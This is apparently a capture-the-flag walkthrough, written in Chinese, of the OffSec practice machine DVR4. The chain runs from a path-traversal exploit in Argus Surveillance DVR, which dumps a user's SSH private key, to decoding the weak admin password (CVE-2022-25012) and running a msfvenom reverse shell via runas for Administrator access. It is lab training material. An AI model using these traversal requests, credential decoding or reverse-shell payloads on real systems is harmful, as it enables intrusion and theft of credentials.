###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# DVR4
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.214.179 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.214.179:22
Open 192.168.214.179:135
Open 192.168.214.179:139
Open 192.168.214.179:8080
Open 192.168.214.179:445
Open 192.168.214.179:5040
Open 192.168.214.179:49664
Open 192.168.214.179:49666
Open 192.168.214.179:49665
Open 192.168.214.179:49667
Open 192.168.214.179:49668
Open 192.168.214.179:49669

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
8080/tcp  open  http-proxy    syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Argus Surveillance DVR
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

查看`http://192.168.218.179:8080/Users.html`可以看到User有`Administrator`跟`Viewer`，可以搜尋[edb-45296](https://www.exploit-db.com/exploits/45296)按照他使用可以成功
```
http://192.168.218.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22

; for 16-bit app support [386Enh] woafont=dosapp.fon EGA80WOA.FON=EGA80WOA.FON EGA40WOA.FON=EGA40WOA.FON CGA80WOA.FON=CGA80WOA.FON CGA40WOA.FON=CGA40WOA.FON [drivers] wave=mmdrv.dll timer=timer.drv [mci] 
```

看能不能得到`Administrator`的`id_rsa`，不行
```
192.168.218.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FAdministrator%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

Cannot find this file.
The requested file: /WEBACCOUNT.CGI?OkBtn= Ok &RESULTPAGE=../../../../../../../../../../../../../../../../Users/Administrator/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" was not found. 
```

換成`Viewer`的`id_rsa`，可以，利用`notepad++`把`空格換成\n`
```
http://192.168.218.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

可以ssh，在`C:\Users\viewer\Desktop`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/pgplay]
└─$ ssh -i id_rsa viewer@192.168.218.179

C:\Users\viewer\Desktop>type local.txt                                       
39187b7c92ce75d3821f02c0196e21d7
```

搜尋到[CVE-2022-25012](https://github.com/s3l33/CVE-2022-25012)，先去該地方拿密碼
```
...
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
...
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
...

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 CVE-2022-25012.py "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[+] D9A8:$

[+] Password: 14WatchD0g$
```

用CME試試看，可成功，但試過`winrm`、`impacket-psexec`、`evil-rm`都不行，只好用`runas`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ crackmapexec smb 192.168.218.179 -u administrator -p '14WatchD0g$' --continue-on-success
SMB         192.168.218.179 445    DVR4             [*] Windows 10.0 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:False)
SMB         192.168.218.179 445    DVR4             [+] DVR4\administrator:14WatchD0g$ (Pwn3d!)
```

但試過nc也不行，只好直接執行一個reverseshell，參考[runas](https://steflan--security-com.translate.goog/windows-privilege-escalation-runas-stored-credentials/?_x_tr_sl=en&_x_tr_tl=zh-TW&_x_tr_hl=zh-TW&_x_tr_pto=sc)，可得reverseshell
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.169 lport=445 -f exe > met_445.exe 

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

C:\Users\viewer\Desktop>runas /savecred /user:Administrator "met_445.exe"
C:\Windows\System32>whoami
whoami
dvr4\administrator
```

在`C:\Users\Administrator\Desktop`可得proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
34dc377c168619298253a8c13351455a
```